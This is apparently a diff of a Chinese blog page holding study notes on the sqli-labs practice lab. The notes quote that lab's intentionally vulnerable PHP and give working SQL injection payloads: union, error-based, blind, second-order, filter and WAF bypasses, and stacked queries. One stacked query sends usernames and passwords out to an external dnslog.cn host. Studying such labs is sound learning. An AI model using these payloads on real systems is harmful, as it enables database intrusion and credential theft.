@@ -82,6 +82,10 @@
       alert('朋友，IE浏览器未适配哦~');
     }
   </script>
+
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
 </head> 
 </html>
 <body class="page-template page-template-user page-template-page-analytics page-template-userpage-analytics-php page page-id-1297 chinese-font serif isWebKit">
@@ -262,6 +266,27 @@
               </li>
             
               <li>
+                <a href="javascript:;">
+                  <span class="faa-parent animated-hover">
+                    <i class="fa  fa-list-ul faa-vertical" aria-hidden="true"></i>
+                    清单
+                  </span>
+                </a>
+                
+                  <ul class="sub-menu">
+                    
+                      <li>
+                        <a href="/fanju/">
+                          <i class="fa fa-film faa-vertical" aria-hidden="true"></i>
+                          追剧
+                        </a>
+                      </li>
+                    
+                  </ul>
+                
+              </li>
+            
+              <li>
                 <a href="/links/">
                   <span class="faa-parent animated-hover">
                     <i class="fa  fa-link faa-shake" aria-hidden="true"></i>
@@ -391,45 +416,45 @@
 <h1 id="GET传参"><a href="#GET传参" class="headerlink" title="GET传参"></a>GET传参</h1><p>先放代码</p>
 <pre><code class="php">&lt;?php
 //including the Mysql connect parameters.
-include(&quot;../sql-connections/sql-connect.php&quot;);
+include("../sql-connections/sql-connect.php");
 error_reporting(0);
 // take the variables 
-if(isset($_GET[&#39;id&#39;]))
+if(isset($_GET['id']))
 {
-$id=$_GET[&#39;id&#39;];
+$id=$_GET['id'];
 //logging the connection parameters to a file for analysis.
-$fp=fopen(&#39;result.txt&#39;,&#39;a&#39;);
-fwrite($fp,&#39;ID:&#39;.$id.&quot;\n&quot;);
+$fp=fopen('result.txt','a');
+fwrite($fp,'ID:'.$id."\n");
 fclose($fp);
 // connectivity 
 //注意get传参
 获取到输入的id后先打开一个result.txt然后把你上传的写入到那个文件里
 这样你再一次操作后你就可以看到你的注入语句真正注进去的是啥了
-$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;
+$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
 //上面一行中$id前后的符号是关键，是注入语句闭合的符号
 $result=mysql_query($sql);
 $row = mysql_fetch_array($result);
 
     if($row)
     {
-          echo &quot;&lt;font size=&#39;5&#39; color= &#39;#99FF00&#39;&gt;&quot;;//正确回显颜色为绿色
-          echo &#39;Your Login name:&#39;. $row[&#39;username&#39;];
-          echo &quot;&lt;br&gt;&quot;;
-          echo &#39;Your Password:&#39; .$row[&#39;password&#39;];
-          echo &quot;&lt;/font&gt;&quot;;
+          echo "&lt;font size='5' color= '#99FF00'&gt;";//正确回显颜色为绿色
+          echo 'Your Login name:'. $row['username'];
+          echo "&lt;br&gt;";
+          echo 'Your Password:' .$row['password'];
+          echo "&lt;/font&gt;";
       }
       //这是输入正确时的反馈，直接把运行结果告诉你
     但是后几关就不一样了
     else 
     {
-        echo &#39;&lt;font color= &quot;#FFFF00&quot;&gt;&#39;;//报错回显为黄色
+        echo '&lt;font color= "#FFFF00"&gt;';//报错回显为黄色
         print_r(mysql_error());
-        echo &quot;&lt;/font&gt;&quot;;  
+        echo "&lt;/font&gt;";  
     }
     //这是输入错误时的反馈，把mysql_error反馈给你
     同样，后几关也不一样了
 }
-    else { echo &quot;Please input the ID as parameter with numeric value&quot;;}
+    else { echo "Please input the ID as parameter with numeric value";}
 //这是反馈你输入为空的
 
 ?&gt;
@@ -485,65 +510,65 @@ $row = mysql_fetch_array($result);
 </blockquote>
 <p>这样 布尔盲注也没法用了<br>你不知道注入语句是对是错<br>这时就要用时间盲注了<br>把布尔盲注再进行包装<br>if(布尔盲注语句,sleep(3),1)<br>正确的话，浏览器会延时3秒再运行<br><img src="https://img-blog.csdnimg.cn/c5682cd2fa574b16bbae457ffa20e388.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="在这里插入图片描述"></p>
 <h1 id="POST传参"><a href="#POST传参" class="headerlink" title="POST传参"></a>POST传参</h1><h2 id="先讲理论-1"><a href="#先讲理论-1" class="headerlink" title="==先讲理论=="></a>==先讲理论==</h2><pre><code class="php+HTML">&lt;!--Form to post the data for sql injections Error based SQL Injection--&gt;
-&lt;form action=&quot;&quot; name=&quot;form1&quot; method=&quot;post&quot;&gt;
-    &lt;div style=&quot;margin-top:15px; height:30px;&quot;&gt;Username : &amp;nbsp;&amp;nbsp;&amp;nbsp;
-        &lt;input type=&quot;text&quot;  name=&quot;uname&quot; value=&quot;&quot;/&gt;
+&lt;form action="" name="form1" method="post"&gt;
+    &lt;div style="margin-top:15px; height:30px;"&gt;Username : &amp;nbsp;&amp;nbsp;&amp;nbsp;
+        &lt;input type="text"  name="uname" value=""/&gt;
     &lt;/div&gt;  
     &lt;div&gt; Password  : &amp;nbsp;&amp;nbsp;&amp;nbsp;
-        &lt;input type=&quot;text&quot; name=&quot;passwd&quot; value=&quot;&quot;/&gt;
+        &lt;input type="text" name="passwd" value=""/&gt;
     &lt;/div&gt;&lt;/br&gt;
-    &lt;div style=&quot; margin-top:9px;margin-left:90px;&quot;&gt;
-        &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot; /&gt;
+    &lt;div style=" margin-top:9px;margin-left:90px;"&gt;
+        &lt;input type="submit" name="submit" value="Submit" /&gt;
     &lt;/div&gt;
 &lt;/form&gt;
         ==上面是前端 通过post传参uname和passwd==
 &lt;?php
 // take the variables
-if(isset($_POST[&#39;uname&#39;]) &amp;&amp; isset($_POST[&#39;passwd&#39;]))
+if(isset($_POST['uname']) &amp;&amp; isset($_POST['passwd']))
 {
-    $uname=$_POST[&#39;uname&#39;];
-    $passwd=$_POST[&#39;passwd&#39;];
+    $uname=$_POST['uname'];
+    $passwd=$_POST['passwd'];
 /后端接收前端传的参数
     //logging the connection parameters to a file for analysis.
-    $fp=fopen(&#39;result.txt&#39;,&#39;a&#39;);
-    fwrite($fp,&#39;User Name:&#39;.$uname);
-    fwrite($fp,&#39;Password:&#39;.$passwd.&quot;\n&quot;);
+    $fp=fopen('result.txt','a');
+    fwrite($fp,'User Name:'.$uname);
+    fwrite($fp,'Password:'.$passwd."\n");
     fclose($fp);
 // connectivity 
-    @$sql=&quot;SELECT username, password FROM users WHERE username=&#39;$uname&#39; and password=&#39;$passwd&#39; LIMIT 0,1&quot;;
+    @$sql="SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1";
     $result=mysql_query($sql);
     $row = mysql_fetch_array($result);
 
     if($row)
     {
-          //echo &#39;&lt;font color= &quot;#0000ff&quot;&gt;&#39;;    
-          echo &quot;&lt;br&gt;&quot;;
-        echo &#39;&lt;font color= &quot;#FFFF00&quot; font size = 4&gt;&#39;;
-        //echo &quot; You Have successfully logged in\n\n &quot; ;
-        echo &#39;&lt;font size=&quot;3&quot; color=&quot;#0000ff&quot;&gt;&#39;;    
-        echo &quot;&lt;br&gt;&quot;;
-        echo &#39;Your Login name:&#39;. $row[&#39;username&#39;];
-        echo &quot;&lt;br&gt;&quot;;
-        echo &#39;Your Password:&#39; .$row[&#39;password&#39;];
-        echo &quot;&lt;br&gt;&quot;;
-        echo &quot;&lt;/font&gt;&quot;;
-        echo &quot;&lt;br&gt;&quot;;
-        echo &quot;&lt;br&gt;&quot;;
-        echo &#39;&lt;img src=&quot;../images/flag.jpg&quot;  /&gt;&#39;;    
+          //echo '&lt;font color= "#0000ff"&gt;';    
+          echo "&lt;br&gt;";
+        echo '&lt;font color= "#FFFF00" font size = 4&gt;';
+        //echo " You Have successfully logged in\n\n " ;
+        echo '&lt;font size="3" color="#0000ff"&gt;';    
+        echo "&lt;br&gt;";
+        echo 'Your Login name:'. $row['username'];
+        echo "&lt;br&gt;";
+        echo 'Your Password:' .$row['password'];
+        echo "&lt;br&gt;";
+        echo "&lt;/font&gt;";
+        echo "&lt;br&gt;";
+        echo "&lt;br&gt;";
+        echo '&lt;img src="../images/flag.jpg"  /&gt;';    
         /又是这里分成两部分，上面是正确回显
         下面是报错回显
-        echo &quot;&lt;/font&gt;&quot;;
+        echo "&lt;/font&gt;";
       }
     else  
     {
-        echo &#39;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#39;;
-        //echo &quot;Try again looser&quot;;
+        echo '&lt;font color= "#0000ff" font size="3"&gt;';
+        //echo "Try again looser";
         print_r(mysql_error());
-        echo &quot;&lt;/br&gt;&quot;;
-        echo &quot;&lt;/br&gt;&quot;;
-        echo &quot;&lt;/br&gt;&quot;;
-        echo &#39;&lt;img src=&quot;../images/slap.jpg&quot; /&gt;&#39;;    
-        echo &quot;&lt;/font&gt;&quot;;  
+        echo "&lt;/br&gt;";
+        echo "&lt;/br&gt;";
+        echo "&lt;/br&gt;";
+        echo '&lt;img src="../images/slap.jpg" /&gt;';    
+        echo "&lt;/font&gt;";  
     }
 }
 ?&gt;
@@ -557,70 +582,70 @@ if(isset($_POST[&#39;uname&#39;]) &amp;&amp; isset($_POST[&#39;passwd&#39;]))
 <h1 id="基于报错注入的各种传参方式"><a href="#基于报错注入的各种传参方式" class="headerlink" title="基于报错注入的各种传参方式"></a>基于报错注入的各种传参方式</h1><h2 id="先讲报错注入"><a href="#先讲报错注入" class="headerlink" title="==先讲报错注入=="></a>==先讲报错注入==</h2><h3 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml"></a>updatexml</h3><p>updatexml (XML_document, XPath_string, new_value)<br>替换查找到的符合条件的数据</p>
 <h3 id="extactvalue"><a href="#extactvalue" class="headerlink" title="extactvalue"></a>extactvalue</h3><p>extractvalue(XML_document, XPath_string)<br>对XML文档进行查询的函数<br>当上述两个函数的xpath路径出错时，将XML_document报错返回回来<br>注意只能返回32个字符，后面的可用limit 等来限制返回的字符位置</p>
 <h2 id="传参方式"><a href="#传参方式" class="headerlink" title="==传参方式=="></a>==传参方式==</h2><p>burp suite抓包后改相应数据</p>
-<h3 id="user-agent注入"><a href="#user-agent注入" class="headerlink" title="user-agent注入"></a>user-agent注入</h3><pre><code class="sql">User-Agent:&#39;or updatexml(1,concat(0x7e,(select database()),0x7e),1) or&#39;
+<h3 id="user-agent注入"><a href="#user-agent注入" class="headerlink" title="user-agent注入"></a>user-agent注入</h3><pre><code class="sql">User-Agent:'or updatexml(1,concat(0x7e,(select database()),0x7e),1) or'
 </code></pre>
 <h3 id="referer注入"><a href="#referer注入" class="headerlink" title="referer注入"></a>referer注入</h3><h3 id="cookie注入"><a href="#cookie注入" class="headerlink" title="cookie注入"></a>cookie注入</h3><h3 id="base64加密的cookie注入"><a href="#base64加密的cookie注入" class="headerlink" title="base64加密的cookie注入"></a>base64加密的cookie注入</h3><p>将payload经base64加密后上传即可</p>
 <h1 id="过滤注释的GET"><a href="#过滤注释的GET" class="headerlink" title="==过滤注释的GET=="></a>==过滤注释的GET==</h1><p>源码中过滤掉了注释符<br>注释符不能用了所以要在闭合上下功夫</p>
-<pre><code class="php">?id=&#39; union select 1,group_concat(username),group_concat(password) from users where 1 or &#39;1&#39; = &#39;1
-?id=-1&#39; union select 1,(select group_concat(username) from users),&#39;3
+<pre><code class="php">?id=' union select 1,group_concat(username),group_concat(password) from users where 1 or '1' = '1
+?id=-1' union select 1,(select group_concat(username) from users),'3
 </code></pre>
 <p>在末尾构造语句使闭合符号与语句组成一个不影响的语句<br>闭合方式多种多样</p>
 <h1 id="二次注入"><a href="#二次注入" class="headerlink" title="==二次注入=="></a>==二次注入==</h1><p>首先注册一个用户admin‘#<br>然后登录<br>修改密码<br>当你修改密码时 后台就执行了</p>
-<pre><code class="sql">UPDATE users SET passwd=&quot;新密码&quot; WHERE username =&#39; admin&#39; # &#39; AND password=&#39;
+<pre><code class="sql">UPDATE users SET passwd="新密码" WHERE username =' admin' # ' AND password='
 </code></pre>
 <p>也就是<br>你用admin’#用户把admin用户的密码给改了</p>
 <h1 id="过滤"><a href="#过滤" class="headerlink" title="==过滤=="></a>==过滤==</h1><h2 id="过滤-or-和-and"><a href="#过滤-or-和-and" class="headerlink" title="过滤 or 和 and"></a>过滤 or 和 and</h2><p>将payload里所有 and 和or<br>替换为 anandd 和 oorr<br>这里password也要变成passwoorrd</p>
 <pre><code class="php">?id=-1 union select 1,2,group_concat(concat_ws(0x7e,username,passwoorrd)) from users#
 </code></pre>
-<h2 id="过滤下的报错注入"><a href="#过滤下的报错注入" class="headerlink" title="过滤下的报错注入"></a>过滤下的报错注入</h2><h3 id="26"><a href="#26" class="headerlink" title="26"></a>26</h3><pre><code class="php">$id= preg_replace(&#39;/or/i&#39;,&quot;&quot;, $id);            /strip out OR (non case sensitive)
-    $id= preg_replace(&#39;/and/i&#39;,&quot;&quot;, $id);        /Strip out AND (non case sensitive)
-    $id= preg_replace(&#39;/[\/\*]/&#39;,&quot;&quot;, $id);        /strip out */
-    $id= preg_replace(&#39;/[--]/&#39;,&quot;&quot;, $id);        /Strip out --
-    $id= preg_replace(&#39;/[#]/&#39;,&quot;&quot;, $id);            /Strip out #
-    $id= preg_replace(&#39;/[\s]/&#39;,&quot;&quot;, $id);        /Strip out spaces
-    $id= preg_replace(&#39;/[\/\\\\]/&#39;,&quot;&quot;, $id);        /Strip out slashes
+<h2 id="过滤下的报错注入"><a href="#过滤下的报错注入" class="headerlink" title="过滤下的报错注入"></a>过滤下的报错注入</h2><h3 id="26"><a href="#26" class="headerlink" title="26"></a>26</h3><pre><code class="php">$id= preg_replace('/or/i',"", $id);            /strip out OR (non case sensitive)
+    $id= preg_replace('/and/i',"", $id);        /Strip out AND (non case sensitive)
+    $id= preg_replace('/[\/\*]/',"", $id);        /strip out */
+    $id= preg_replace('/[--]/',"", $id);        /Strip out --
+    $id= preg_replace('/[#]/',"", $id);            /Strip out #
+    $id= preg_replace('/[\s]/',"", $id);        /Strip out spaces
+    $id= preg_replace('/[\/\\\\]/',"", $id);        /Strip out slashes
     return $id;
 </code></pre>
 <p>要用到||代替or information里的or要双写，用||‘1’=‘1来闭合</p>
-<pre><code class="php">?id=0&#39;||updatexml(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=&#39;security&#39;))),1)||&#39;1&#39;=&#39;1
+<pre><code class="php">?id=0'||updatexml(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema='security'))),1)||'1'='1
 </code></pre>
 <p><img src="https://img-blog.csdnimg.cn/41bb72de0481416fa30c710fad9b1959.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="在这里插入图片描述"></p>
 <h3 id="27"><a href="#27" class="headerlink" title="27"></a>27</h3><p><img src="https://img-blog.csdnimg.cn/73dc47cc35d046f39f35db64fba9fca9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
-<pre><code class="php">?id=0&#39;||updatexml(1,concat(0x7e,(SeLect(group_concat(table_name))from(information_schema.tables)where(table_schema=&#39;security&#39;))),1)||&#39;1&#39;=&#39;1
+<pre><code class="php">?id=0'||updatexml(1,concat(0x7e,(SeLect(group_concat(table_name))from(information_schema.tables)where(table_schema='security'))),1)||'1'='1
 </code></pre>
 <p>大小写select和union</p>
 <h2 id="过滤下的时间盲注"><a href="#过滤下的时间盲注" class="headerlink" title="过滤下的时间盲注"></a>过滤下的时间盲注</h2><p>26到27关的a都是无法报错注入的<br>能用时间盲注过滤方法和不带a的关一样</p>
 <h1 id="waf"><a href="#waf" class="headerlink" title="==waf=="></a>==waf==</h1><pre><code class="php">/ take the variables 
-if(isset($_GET[&#39;id&#39;])){
-    $qs = $_SERVER[&#39;QUERY_STRING&#39;];
+if(isset($_GET['id'])){
+    $qs = $_SERVER['QUERY_STRING'];
     $hint=$qs;
     $id1=java_implimentation($qs);
-    $id=$_GET[&#39;id&#39;];
+    $id=$_GET['id'];
     //echo $id1;
     whitelist($id1);}
 
 /WAF implimentation with a whitelist approach..... only allows input to be Numeric.
 function whitelist($input){
-    $match = preg_match(&quot;/^\d+$/&quot;, $input);
+    $match = preg_match("/^\d+$/", $input);
     if($match)
-        {//echo &quot;you are good&quot;;
+        {//echo "you are good";
             //return $match;
             }
     else
-        {header(&#39;Location: hacked.php&#39;);
-            //echo &quot;you are bad&quot;;
+        {header('Location: hacked.php');
+            //echo "you are bad";
             }
 }
 / The function below immitates the behavior of parameters when subject to HPP (HTTP Parameter Pollution).
 function java_implimentation($query_string){
     $q_s = $query_string;
-    $qs_array= explode(&quot;&amp;&quot;,$q_s);
+    $qs_array= explode("&amp;",$q_s);
     foreach($qs_array as $key =&gt; $value){
         $val=substr($value,0,2);
-        if($val==&quot;id&quot;){
+        if($val=="id"){
             $id_value=substr($value,3,30); 
             return $id_value;
-            echo &quot;&lt;br&gt;&quot;;
+            echo "&lt;br&gt;";
             break;}
         }
 }
@@ -630,7 +655,7 @@ function java_implimentation($query_string){
 <h2 id="结束注释"><a href="#结束注释" class="headerlink" title="==结束注释=="></a>==结束注释==</h2><p>当转译为‘/时可用’/**/来==结束注释==</p>
 <h1 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="==堆叠注入=="></a>==堆叠注入==</h1><p>在SQL中，分号（;）是用来表示一条sql语句的结束。结束一个sql语句后继续构造下一条语句，会一起执行 因此产生了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间区别在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句<br>堆叠注入为攻击者提供了很多的攻击手段，通过添加一个新 的查询或者终止查询，可以达到修改数据和调用存储过程的目的。这种技术在SQL注入中还是比较频繁的。<br>如下展示了堆叠注入插入了一个用户数据</p>
 <p><img src="https://img-blog.csdnimg.cn/382b3c83943547868cbe1452eb266b25.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/ba1f6818754e470bb14c6e4bbacded8d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="在这里插入图片描述">同时也可以进行dnslog注入</p>
-<pre><code class="php">?id=1&#39;;select load_file(concat(&#39;//&#39;,(select hex(concat_ws(&#39;~&#39;,username,password)) from users limit 0,1),&#39;.au0mvd.dnslog.cn/1.txt&#39;));--+
+<pre><code class="php">?id=1';select load_file(concat('//',(select hex(concat_ws('~',username,password)) from users limit 0,1),'.au0mvd.dnslog.cn/1.txt'));--+
 </code></pre>
 <p><img src="https://img-blog.csdnimg.cn/9b01f339db4641799cd67780c58d458e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="在这里插入图片描述"></p>
 <pre><code class="css">desc查看表结构的详细信息
@@ -649,20 +674,20 @@ handler handler_table close;
 //mysql connections for stacked query examples.
 $con1 = mysqli_connect($host,$dbuser,$dbpass, $dbname);
 
-   $username = mysqli_real_escape_string($con1, $_POST[&quot;login_user&quot;]);
-   $password = $_POST[&quot;login_password&quot;];
+   $username = mysqli_real_escape_string($con1, $_POST["login_user"]);
+   $password = $_POST["login_password"];
 
    // Check connection
    if (mysqli_connect_errno($con1))
    {
-       echo &quot;Failed to connect to MySQL: &quot; . mysqli_connect_error();
+       echo "Failed to connect to MySQL: " . mysqli_connect_error();
    }
    else
    {
-       @mysqli_select_db($con1, $dbname) or die ( &quot;Unable to connect to the database ######: &quot;);
+       @mysqli_select_db($con1, $dbname) or die ( "Unable to connect to the database ######: ");
    }
  /* execute multi query */
-     $sql = &quot;SELECT * FROM users WHERE username=&#39;$username&#39; and password=&#39;$password&#39;&quot;;
+     $sql = "SELECT * FROM users WHERE username='$username' and password='$password'";
    if (@mysqli_multi_query($con1, $sql))
    {
         /* store first result set */
@@ -679,69 +704,69 @@ $con1 = mysqli_connect($host,$dbuser,$dbpass, $dbname);
       }
 
       else  {
-    echo &#39;&lt;font size=&quot;5&quot; color= &quot;#FFFF00&quot;&gt;&#39;;
+    echo '&lt;font size="5" color= "#FFFF00"&gt;';
     print_r(mysqli_error($con1));
-    echo &quot;&lt;/font&gt;&quot;;  
+    echo "&lt;/font&gt;";  
       }
    }
    else 
    {
-    echo &#39;&lt;font size=&quot;5&quot; color= &quot;#FFFF00&quot;&gt;&#39;;
+    echo '&lt;font size="5" color= "#FFFF00"&gt;';
     print_r(mysqli_error($con1));
-    echo &quot;&lt;/font&gt;&quot;;  
+    echo "&lt;/font&gt;";  
     }
 </code></pre>
 <p>这里对username和password过滤不强<br>可通过万能密码</p>
-<pre><code class="php"> 1’ or &#39;1&#39;=&#39;1
+<pre><code class="php"> 1’ or '1'='1
 </code></pre>
 <p> 登录<br> 接下来通过修改密码界面二次注入</p>
 <pre><code class="php"> &lt;?PHP
 session_start();
-if (!isset($_COOKIE[&quot;Auth&quot;])){
-    if (!isset($_SESSION[&quot;username&quot;])) {
-           header(&#39;Location: index.php&#39;);
+if (!isset($_COOKIE["Auth"])){
+    if (!isset($_SESSION["username"])) {
+           header('Location: index.php');
     }
-    header(&#39;Location: index.php&#39;);
+    header('Location: index.php');
 }
 ?&gt;
 &lt;?php
 //including the Mysql connect parameters.
-include(&quot;../sql-connections/sql-connect.php&quot;);
-if (isset($_POST[&#39;submit&#39;])){
+include("../sql-connections/sql-connect.php");
+if (isset($_POST['submit'])){
     # Validating the user input........
-    $username= $_SESSION[&quot;username&quot;];
-    $curr_pass= mysql_real_escape_string($_POST[&#39;current_password&#39;]);//原密码 还是万能密码绕过
-    $pass= mysql_real_escape_string($_POST[&#39;password&#39;]);//新密码
-    $re_pass= mysql_real_escape_string($_POST[&#39;re_password&#39;]);
+    $username= $_SESSION["username"];
+    $curr_pass= mysql_real_escape_string($_POST['current_password']);//原密码 还是万能密码绕过
+    $pass= mysql_real_escape_string($_POST['password']);//新密码
+    $re_pass= mysql_real_escape_string($_POST['re_password']);
     if($pass==$re_pass){    
-        $sql = &quot;UPDATE users SET PASSWORD=&#39;$pass&#39; where username=&#39;$username&#39; and password=&#39;$curr_pass&#39; &quot;;
-        $res = mysql_query($sql) or die(&#39;You tried to be smart, Try harder!!!! :( &#39;);
+        $sql = "UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' ";
+        $res = mysql_query($sql) or die('You tried to be smart, Try harder!!!! :( ');
         $row = mysql_affected_rows();
-        echo &#39;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&#39;;
-        echo &#39;&lt;center&gt;&#39;;
+        echo '&lt;font size="3" color="#FFFF00"&gt;';
+        echo '&lt;center&gt;';
         if($row==1){
-            //echo &quot;Password successfully updated&quot;;
-            echo &#39;&lt;img src=&quot;../images/password-updated.jpg&quot;&gt;&#39;;
+            //echo "Password successfully updated";
+            echo '&lt;img src="../images/password-updated.jpg"&gt;';
             }
         else{
-            header(&#39;Location: failed.php&#39;);
-            //echo &#39;You tried to be smart, Try harder!!!! :( &#39;;
+            header('Location: failed.php');
+            //echo 'You tried to be smart, Try harder!!!! :( ';
 
         }
     }
     else{
-        echo &#39;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&lt;center&gt;&#39;;
-        echo &quot;Make sure New Password and Retype Password fields have same value&quot;;
-        header(&#39;refresh:2, url=index.php&#39;);
+        echo '&lt;font size="5" color="#FFFF00"&gt;&lt;center&gt;';
+        echo "Make sure New Password and Retype Password fields have same value";
+        header('refresh:2, url=index.php');
     }
 }
 ?&gt;
 &lt;?php
-if(isset($_POST[&#39;submit1&#39;]))
+if(isset($_POST['submit1']))
 {
     session_destroy();
-    setcookie(&#39;Auth&#39;, 1 , time()-3600);
-    header (&#39;Location: index.php&#39;);
+    setcookie('Auth', 1 , time()-3600);
+    header ('Location: index.php');
 }
 ?&gt;
 </code></pre>
@@ -754,82 +779,82 @@ if(isset($_POST[&#39;submit1&#39;]))
 <pre><code class="php">&lt;?php
 id注入部分代码
 //including the Mysql connect parameters.
-include &#39;../sql-connections/sql-connect-1.php&#39;;
-include &#39;../sql-connections/functions.php&#39;;
+include '../sql-connections/sql-connect-1.php';
+include '../sql-connections/functions.php';
 error_reporting(0);
-$pag = $_SERVER[&#39;PHP_SELF&#39;]; /generating page address to piggy back after redirects...
-$characters = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#39;; /characterset for generating random data
+$pag = $_SERVER['PHP_SELF']; /generating page address to piggy back after redirects...
+$characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'; /characterset for generating random data
 $times= 10;
 $table = table_name();
 $col = column_name(1);     / session id column name
 $col1 = column_name(2);   /secret key column name
 / Submitting the final answer
-if(!isset($_POST[&#39;answer_key&#39;])){
+if(!isset($_POST['answer_key'])){
     / resetting the challenge and repopulating the table .
-    if(isset($_POST[&#39;reset&#39;])){
-        setcookie(&#39;challenge&#39;, &#39; &#39;, time() - 3600000);
-        echo &quot;&lt;font size=4&gt;You have reset the Challenge&lt;/font&gt;&lt;br&gt;\n&quot;;
-        echo &quot;Redirecting you to main challenge page..........\n&quot;;
-        header( &quot;refresh:4;url=../sql-connections/setup-db-challenge.php?id=$pag&quot; );
-        //echo &quot;cookie expired&quot;;
+    if(isset($_POST['reset'])){
+        setcookie('challenge', ' ', time() - 3600000);
+        echo "&lt;font size=4&gt;You have reset the Challenge&lt;/font&gt;&lt;br&gt;\n";
+        echo "Redirecting you to main challenge page..........\n";
+        header( "refresh:4;url=../sql-connections/setup-db-challenge.php?id=$pag" );
+        //echo "cookie expired";
 
     }
     else{
         / Checking the cookie on the page and populate the table with random value.
-        if(isset($_COOKIE[&#39;challenge&#39;])){
-            $sessid=$_COOKIE[&#39;challenge&#39;];
-            //echo &quot;Cookie value: &quot;.$sessid;
+        if(isset($_COOKIE['challenge'])){
+            $sessid=$_COOKIE['challenge'];
+            //echo "Cookie value: ".$sessid;
         }
         else{
             $expire = time()+60*60*24*30;
             $hash = data($table,$col);
-            setcookie(&quot;challenge&quot;, $hash, $expire);
+            setcookie("challenge", $hash, $expire);
 
         }
 
-        echo &quot;&lt;br&gt;\n&quot;;
+        echo "&lt;br&gt;\n";
         /take the variables
-        if(isset($_GET[&#39;id&#39;])){
-            $id=$_GET[&#39;id&#39;];
+        if(isset($_GET['id'])){
+            $id=$_GET['id'];
             /logging the connection parameters to a file for analysis.
-            $fp=fopen(&#39;result.txt&#39;,&#39;a&#39;);
-            fwrite($fp,&#39;ID:&#39;.$id.&quot;\n&quot;);
+            $fp=fopen('result.txt','a');
+            fwrite($fp,'ID:'.$id."\n");
             fclose($fp);
             /update the counter in database
             next_tryy();
             /Display attempts on screen.
             $tryyy = view_attempts();
-            echo &quot;You have made : &quot;. $tryyy .&quot; of $times attempts&quot;;
-            echo &quot;&lt;br&gt;&lt;br&gt;&lt;br&gt;\n&quot;;
+            echo "You have made : ". $tryyy ." of $times attempts";
+            echo "&lt;br&gt;&lt;br&gt;&lt;br&gt;\n";
           /Reset the Database if you exceed allowed attempts.
             if($tryyy &gt;= ($times+1)){
-                setcookie(&#39;challenge&#39;, &#39; &#39;, time() - 3600000);
-                echo &quot;&lt;font size=4&gt;You have exceeded maximum allowed attempts, Hence Challenge Has Been Reset &lt;/font&gt;&lt;br&gt;\n&quot;;
-                echo &quot;Redirecting you to challenge page..........\n&quot;;
-                header( &quot;refresh:3;url=../sql-connections/setup-db-challenge.php?id=$pag&quot; );
-                echo &quot;&lt;br&gt;\n&quot;;
+                setcookie('challenge', ' ', time() - 3600000);
+                echo "&lt;font size=4&gt;You have exceeded maximum allowed attempts, Hence Challenge Has Been Reset &lt;/font&gt;&lt;br&gt;\n";
+                echo "Redirecting you to challenge page..........\n";
+                header( "refresh:3;url=../sql-connections/setup-db-challenge.php?id=$pag" );
+                echo "&lt;br&gt;\n";
             }    
         / Querry DB to get the correct output
-            $sql=&quot;SELECT * FROM security.users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;
+            $sql="SELECT * FROM security.users WHERE id='$id' LIMIT 0,1";
             $result=mysql_query($sql);
             $row = mysql_fetch_array($result);
             if($row){
-                echo &#39;&lt;font color= &quot;#00FFFF&quot;&gt;&#39;;    
